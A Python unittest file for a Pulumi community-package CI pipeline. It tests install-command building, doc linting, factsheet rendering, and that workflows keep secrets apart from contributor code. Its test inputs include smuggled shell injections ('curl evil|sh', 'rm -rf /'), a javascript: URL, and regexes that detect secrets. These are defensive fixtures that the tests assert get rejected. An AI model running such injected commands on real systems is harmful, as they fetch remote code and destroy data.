#!/usr/bin/env python3
"""Unit tests for the community-package pipeline. Pure functions only, no network,
no real installs. The install probes are tested by monkeypatching `_run` so we assert
the exact argv built from the schema without executing anything.

Run: python3 -m unittest scripts/ci/community-package/test_pipeline.py -v
"""
from __future__ import annotations

import re
import sys
import unittest
from typing import Any
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import pipeline as p  # noqa: E402

SCHEMA: dict[str, Any] = {
    "name": "time",
    "pluginDownloadURL": "https://get.example.com/time",
    "language": {
        "nodejs": {"packageName": "@pulumiverse/time"},
        "python": {"packageName": "pulumiverse_time"},
        "go": {"importBasePath": "github.com/pulumiverse/pulumi-time/sdk/go/time"},
    },
}


class InstallCommandTests(unittest.TestCase):
    def setUp(self) -> None:
        self.calls: list[list[str]] = []
        self._orig = p._run

        def fake(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            self.calls.append(cmd)
            return True, ""

        p._run = fake

    def tearDown(self) -> None:
        p._run = self._orig

    def _flat(self) -> list[str]:
        return [" ".join(c) for c in self.calls]

    def test_commands_built_from_schema_fields(self) -> None:
        matrix = p.install_verify("time", "v0.1.1", SCHEMA)
        cmds = {r.language: r.command for r in matrix}
        self.assertEqual(cmds["plugin"], "pulumi plugin install resource time v0.1.1")
        self.assertEqual(cmds["nodejs"], "npm install @pulumiverse/time@0.1.1")
        self.assertEqual(cmds["python"], "pip download pulumiverse_time==0.1.1")
        self.assertIn("go get github.com/pulumiverse/pulumi-time/sdk/go/time@v0.1.1", cmds["go"])
        self.assertTrue(all(r.result == "pass" for r in matrix))

    def test_identifiers_passed_as_argv_after_separator(self) -> None:
        p.install_verify("time", "v0.1.1", SCHEMA)
        flat = self._flat()
        self.assertTrue(any("npm install" in c and "-- @pulumiverse/time@0.1.1" in c for c in flat))
        self.assertTrue(any("pip download" in c and "-- pulumiverse_time==0.1.1" in c for c in flat))
        self.assertTrue(any(c.startswith("pulumi plugin install resource time v0.1.1") for c in flat))
        self.assertTrue(any("--server https://get.example.com/time" in c for c in flat))

    def test_version_is_pinned_not_latest(self) -> None:
        p.install_verify("time", "v2.3.4", SCHEMA)
        self.assertTrue(all("2.3.4" in " ".join(c) or "mod" in " ".join(c) or "init" in " ".join(c)
                            for c in self.calls if "get" in " ".join(c) or "install" in " ".join(c) or "download" in " ".join(c)))

    def test_bad_plugin_url_is_dropped(self) -> None:
        bad = {**SCHEMA, "pluginDownloadURL": "javascript:alert(1)"}
        p.install_verify("time", "v0.1.1", bad)
        self.assertFalse(any("--server" in c for c in self._flat()))

    def test_injection_in_name_is_rejected_and_never_executed(self) -> None:
        evil = {**SCHEMA, "language": {**SCHEMA["language"], "nodejs": {"packageName": "foo; curl evil|sh"}}}
        matrix = p.install_verify("time", "v0.1.1", evil)
        node = next(r for r in matrix if r.language == "nodejs")
        self.assertEqual(node.result, "rejected")
        self.assertFalse(any(c and c[0] == "npm" for c in self.calls))

    def test_injection_in_provider_name_rejects_plugin(self) -> None:
        matrix = p.install_verify("time; rm -rf /", "v0.1.1", SCHEMA)
        plugin = next(r for r in matrix if r.language == "plugin")
        self.assertEqual(plugin.result, "rejected")
        self.assertFalse(any(c and c[0] == "pulumi" for c in self.calls))

    def test_python_falls_back_to_pulumi_underscore_name(self) -> None:
        no_py = {"name": "thoth", "language": {"go": SCHEMA["language"]["go"]}}
        matrix = p.install_verify("thoth", "v1.0.0", no_py)
        py = next(r for r in matrix if r.language == "python")
        self.assertEqual(py.command, "pip download pulumi_thoth==1.0.0")


class EntryAndDocTests(unittest.TestCase):
    def test_diff_entries_detects_added(self) -> None:
        before = '{"include":[{"repoSlug":"a/b","schemaFile":"s"}]}'
        after = '{"include":[{"repoSlug":"a/b","schemaFile":"s"},{"repoSlug":"c/d","schemaFile":"t"}]}'
        self.assertEqual([e.repoSlug for e in p.diff_entries(before, after)], ["c/d"])

    def test_diff_entries_no_change(self) -> None:
        same = '{"include":[{"repoSlug":"a/b","schemaFile":"s"}]}'
        self.assertEqual(p.diff_entries(same, same), [])

    def test_diff_entries_accepts_packages_or_bare_array(self) -> None:
        self.assertEqual([e.repoSlug for e in p.diff_entries('{"packages":[]}', '{"packages":[{"repoSlug":"a/b","schemaFile":"s"}]}')], ["a/b"])
        self.assertEqual([e.repoSlug for e in p.diff_entries("[]", '[{"repoSlug":"a/b","schemaFile":"s"}]')], ["a/b"])

    def test_provider_name_prefers_schema_then_repo_suffix(self) -> None:
        self.assertEqual(p.provider_name("x/pulumi-thoth", {"name": "thoth"}), "thoth")
        self.assertEqual(p.provider_name("x/pulumi-thoth", {}), "thoth")
        self.assertEqual(p.provider_name("x/pulumi-provider-dex", {}), "provider-dex")

    def test_lint_flags_relative_refs_and_ignores_absolute(self) -> None:
        doc = (
            "![logo](./logo.png)\n"
            "<img src='/x.svg'>\n"
            "<a href=\"./page\">y</a>\n"
            "[ok](https://example.com)\n"
            "![ok](https://example.com/y.png)\n"
        )
        findings = p.lint_docs(doc)
        self.assertEqual(len(findings), 3)
        self.assertEqual({f.line for f in findings}, {1, 2, 3})
        self.assertIn("relative-image", {f.kind for f in findings})
        self.assertIn("raw-relative-link", {f.kind for f in findings})

    def test_lint_clean_doc(self) -> None:
        self.assertEqual(p.lint_docs("all good\n[x](https://y)\n![a](https://y/z.png)\n"), [])


class FactsheetTests(unittest.TestCase):
    def _manifest(self, findings: list[p.DocFinding], install: list[p.InstallResult]) -> p.Manifest:
        return p.Manifest(
            "x/pulumi-demo", "s.json", "demo", p.Version("v1.0.0", "0" * 40),
            p.Content("abc123def456", "d"), p.Owner("x", False), {"resourcedocsgen": "go1.26"},
            install, {"findings": findings}, p.Gate(True, 0),
        )

    def test_renders_install_failure_details(self) -> None:
        out = p.factsheet(self._manifest([], [
            p.InstallResult("python", "pip download x==1", "fail", error="No matching distribution found for x==1"),
        ]))
        self.assertIn("pip download x==1", out)
        self.assertIn("No matching distribution found", out)
        self.assertIn("<details>", out)

    def test_renders_lint_findings_with_message(self) -> None:
        out = p.factsheet(self._manifest([p.DocFinding(12, "relative-image", "![a](./b.png)")], []))
        self.assertIn("Doc-lint: 1 finding(s)", out)
        self.assertIn("docs/_index.md:12", out)
        self.assertIn("![a](./b.png)", out)

    def test_clean_lint_line_when_no_findings(self) -> None:
        out = p.factsheet(self._manifest([], [p.InstallResult("plugin", "pulumi …", "pass", blocking=True)]))
        self.assertIn("No relative images", out)

    def test_red_gate_shows_not_ready_verdict(self) -> None:
        m = self._manifest([], [p.InstallResult("plugin", "pulumi …", "fail", blocking=True)])
        m.gate = p.Gate(False, 1)
        out = p.factsheet(m)
        self.assertIn("❌", out.splitlines()[0])
        self.assertIn("Not ready", out)
        self.assertIn("/check", out)

    def test_embeds_doc_source_inline(self) -> None:
        m = self._manifest([], [])
        m.docs = [p.DocRef("docs/_index.md", 3, "# Title\n```go\ncode\n```\n")]
        out = p.factsheet(m)
        self.assertIn("Provider docs", out)
        self.assertIn("open full file", out)
        self.assertIn("/blob/" + "0" * 40 + "/docs/_index.md", out)
        self.assertIn("# Title", out)          # source embedded
        self.assertIn("<details>", out)

    def test_fence_outgrows_embedded_backticks(self) -> None:
        # a doc containing a ``` fence must be wrapped in a longer fence
        self.assertEqual(p._fence_for("no ticks"), "```")
        self.assertEqual(p._fence_for("```go\nx\n```"), "````")


class SecretCodeSeparationTests(unittest.TestCase):
    """No community-package workflow may both hold a secret and run a contributor's code;
    if one did, a malicious package could read the secret."""

    EXEC = re.compile(r"pipeline\.py check(?![-\w])|npm (install|ci)|pip (install|download)"
                      r"|go get|go mod download|pulumi plugin install")
    SECRET = re.compile(r"secrets\.|ESC_ACTION|esc-action|ANTHROPIC_API_KEY|PULUMI_BOT_TOKEN|id-token: *write")

    def _workflows(self) -> list[Path]:
        wfs = sorted((Path(__file__).resolve().parents[3] / ".github/workflows").glob("community-package-*.yml"))
        self.assertTrue(wfs, "no community-package workflows found")
        return wfs

    def test_no_secret_shares_a_job_with_contributor_code(self) -> None:
        for wf in self._workflows():
            text = wf.read_text()
            mixes = bool(self.EXEC.search(text)) and bool(self.SECRET.search(text))
            self.assertFalse(mixes, f"{wf.name} mixes secrets with contributor-code execution")

    def test_no_pull_request_target(self) -> None:
        for wf in self._workflows():
            self.assertNotIn("pull_request_target", wf.read_text(), f"{wf.name} uses pull_request_target")

    def test_secret_workflow_never_checks_out_the_pr_head(self) -> None:
        for wf in self._workflows():
            text = wf.read_text()
            if self.SECRET.search(text):
                self.assertNotRegex(text, r"ref:.*\.head\.", f"{wf.name} checks out the PR head with a secret present")


if __name__ == "__main__":
    unittest.main()
